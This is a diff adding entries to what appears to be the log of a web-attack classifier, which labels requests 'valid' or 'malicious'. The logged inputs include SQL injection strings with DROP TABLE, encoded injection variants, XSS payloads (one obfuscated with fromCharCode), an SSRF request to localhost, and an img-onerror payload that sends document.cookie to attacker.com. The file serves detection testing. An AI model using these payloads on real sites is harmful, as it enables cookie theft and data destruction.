@@ -100,3 +100,70 @@
 2025-05-01 17:05:14 - GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1 Host: www.example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: keep-alive - malicious(ML)
 2025-05-01 17:10:35 - rrrr - valid
 2025-05-01 17:10:40 - GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1 Host: www.example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: keep-alive - malicious(ML)
+2025-05-13 15:58:28 - GET /products?category=electronics&page=2 HTTP/1.1 - valid
+2025-05-13 15:58:49 - GET /search?q=' OR '1'='1'; DROP TABLE users;-- HTTP/1.1 - malicious(signature)
+2025-05-27 09:42:28 - GET /products?category=electronics&page=2 HTTP/1.1 - valid
+2025-05-27 09:42:43 - POST /cart/add HTTP/1.1 - valid
+2025-05-27 09:43:05 - GET /search?q=' OR '1'='1'; DROP TABLE users;-- HTTP/1.1 - malicious(signature)
+2025-05-27 09:48:04 - GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1 - malicious(ML)
+2025-05-27 09:48:22 - GET /search?q=\x27\x20OR\x20\x31\x3D\x31 HTTP/1.1 - malicious(ML)
+2025-07-01 08:00:59 - GET /search?q=' OR '1'='1'; DROP TABLE users;-- HTTP/1.1 Host: www.example.com - malicious(signature)
+2025-07-01 08:02:33 - GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1 Host: www.example.com - malicious(ML)
+2025-07-01 08:03:52 - GET /search?q=<script>alert('XSS')</script> HTTP/1.1 Host: www.example.com - malicious(signature)
+2025-07-01 08:04:03 - GET /proxy?url=http://127.0.0.1:8000/internal HTTP/1.1 Host: www.example.com - malicious(signature)
+2025-07-01 08:06:03 - POST /cart/add HTTP/1.1 Host: www.ecommerce.com Content-Type: application/json Content-Length: 45  {"productId": "12345", "quantity": 1} - valid
+2025-07-01 08:07:17 - GET /proxy?url=http://127.0.0.1:8000/internal HTTP/1.1 Host: www.example.com - malicious(signature)
+2025-07-01 08:07:34 - GET /?q=<img src=x onerror="location='http://attacker.com?cookie='+document.cookie"> HTTP/1.1 Host: www.example.com - malicious(signature)
+2025-07-01 08:29:42 - GET /?q=<img src=x onerror="location='http://attacker.com?cookie='+document.cookie"> HTTP/1.1 Host: www.example.com - malicious(signature)
+2025-07-01 08:29:43 - GET /?q=<img src=x onerror="location='http://attacker.com?cookie='+document.cookie"> HTTP/1.1 Host: www.example.com - malicious(signature)
+2025-07-01 15:33:08 - GET /?q=<img src=x onerror="location='http://attacker.com?cookie='+document.cookie"> HTTP/1.1 Host: www.example.com - malicious(signature)
+2025-07-01 15:33:09 - GET /?q=<img src=x onerror="location='http://attacker.com?cookie='+document.cookie"> HTTP/1.1 Host: www.example.com - malicious(signature)
+2025-07-02 10:04:13 - GET /search?q=' OR '1'='1'; DROP TABLE users;-- HTTP/1.1 Host: www.example.com - malicious(signature)
+2025-07-02 10:12:33 - GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1 Host: www.example.com - malicious(ML)
+2025-07-02 13:44:45 - GET /search?q=' OR '1'='1'; DROP TABLE users;-- HTTP/1.1 Host: www.example.com - malicious(signature)
+2025-07-03 07:44:42 - GET /search?q=' OR '1'='1'; DROP TABLE users;-- HTTP/1.1 Host: www.example.com - malicious(signature)
+2025-07-09 19:45:38 - GET /search?q=' OR '1'='1'; DROP TABLE users;-- HTTP/1.1 Host: www.example.com - malicious(signature)
+2025-07-09 19:46:19 - GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1 Host: www.example.com - malicious(ML)
+2025-07-14 21:53:30 - GET /search?q=' OR '1'='1'; DROP TABLE users;-- HTTP/1.1 Host: www.example.com - malicious(signature)
+2025-07-14 21:55:15 - GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1 Host: www.example.com - malicious(ML)
+2025-07-14 21:55:15 - GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1 Host: www.example.com - malicious(ML)
+2025-07-14 22:04:23 - https://www.youtube.com/ - valid
+2025-07-14 22:08:47 - https://takeuforward.org/strivers-a2z-dsa-course/strivers-a2z-dsa-course-sheet-2 - valid
+2025-09-10 10:14:29 - example.com - valid
+2025-09-10 10:14:34 - example.co - valid
+2025-09-10 10:14:38 - example.c - valid
+2025-09-10 10:15:37 - www.example.com - valid
+2025-09-10 10:16:52 - www.ecommerce.com - valid
+2025-09-10 10:17:05 - www.lmsklmd.com - valid
+2025-09-10 10:17:14 - www.lmsklmd.in - valid
+2025-09-10 10:17:20 - www. - valid
+2025-09-10 10:18:25 - GET /search?q=' OR '1'='1'; DROP TABLE users;-- HTTP/1.1 - malicious(signature)
+2025-09-10 10:19:07 - GET /products?category=electronics&page=2 HTTP/1.1 - valid
+2025-09-10 10:20:29 - GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1 Host: www.example.com - malicious(ML)
+2025-09-10 10:28:48 - GET /search?q=' OR '1'='1'; DROP TABLE users;-- HTTP/1.1 Host: www.example.com - malicious(signature)
+2025-09-10 10:31:10 - GET /comment?text=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script> HTTP/1.1 Host: www.example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: keep-alive - malicious(signature)
+2025-09-10 10:32:08 - https://www.netflix.com/browse - valid
+2025-09-10 10:33:10 - https://chat.openai.com/ - valid
+2025-09-10 10:33:18 - https://chat.open.com/ - valid
+2025-09-10 10:33:21 - https://ct.open.com/ - valid
+2025-09-10 10:33:30 - megandas.com - valid
+2025-09-10 10:33:34 - megandas - valid
+2025-09-10 11:25:46 - GET /comment?text=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script> HTTP/1.1 Host: www.example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: keep-alive - malicious(signature)
+2025-09-10 11:26:55 - GET /comment?text=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script> HTTP/1.1 Host: www.example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: keep-alive - malicious(signature)
+2025-09-10 11:50:01 - www.google.com - valid
+2025-09-10 11:50:05 - www.goe.com - valid
+2025-09-10 11:50:15 - GET /comment?text=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script> HTTP/1.1 Host: www.example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: keep-alive - malicious(signature)
+2025-09-10 11:50:23 - POST /comment?text=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script> HTTP/1.1 Host: www.example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: keep-alive - malicious(signature)
+2025-09-10 13:04:26 - GET /comment?text=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script> HTTP/1.1 Host: www.example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: keep-alive - malicious(signature)
+2025-11-09 23:03:29 - GET /comment?text=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script> HTTP/1.1 Host: www.example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: keep-alive - malicious(signature)
+2025-11-09 23:04:45 - www.google.com - valid
+2025-11-09 23:04:58 - www.goo.com - valid
+2025-11-09 23:05:09 - GET /comment?text=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script> HTTP/1.1 Host: www.example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: keep-alive - malicious(signature)
+2026-01-29 16:03:41 - GET /comment?text=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script> HTTP/1.1 Host: www.example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: keep-alive - malicious(signature) - malicious(signature)
+2026-01-29 16:03:54 - GET /comment?text=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script> HTTP/1.1 Host: www.example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: keep-alive - malicious(signature)
+2026-01-29 16:04:23 - www.scx.com - valid
+2026-01-29 16:04:37 -  - valid
+2026-01-29 16:28:27 - GET /search?q=' OR '1'='1'; DROP TABLE users;-- HTTP/1.1 - malicious(signature)
+2026-01-29 16:58:46 - GET /search?q=' OR '1'='1'; DROP TABLE users;-- HTTP/1.1 - malicious(signature)
+2026-01-29 16:59:13 - www.google.com - valid
+2026-02-02 16:20:11 - GET /search?q=' OR '1'='1'; DROP TABLE users;-- HTTP/1.1 - malicious(signature)
